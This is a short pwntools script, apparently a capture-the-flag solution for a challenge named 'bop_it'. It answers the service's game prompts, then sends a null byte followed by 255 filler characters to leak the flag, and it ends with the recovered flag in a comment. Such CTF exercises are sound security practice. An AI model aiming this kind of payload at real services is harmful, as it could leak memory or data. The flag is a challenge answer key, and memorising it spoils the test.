from pwn import *

#p = process("./bop_it")
p = remote("shell.actf.co",20702)
payload = ""

while 1 : 
    log.info("try")
    string = p.recvline()
    #pause()
    #p.sendline("\xff")
    if "Twist" in string : 
        p.sendline("T")
    elif "Pull" in string : 
        p.sendline("P")
    elif "Bop" in string : 
        p.sendline("B")
    elif "Flag" in string : 
        pause()
       # p.sendline("")
        payload = "\x00"+"a"*0xff
        p.sendline(payload)
        print p.recv()


p.interactive()
#actf{bopp1ty_bop_bOp_b0p}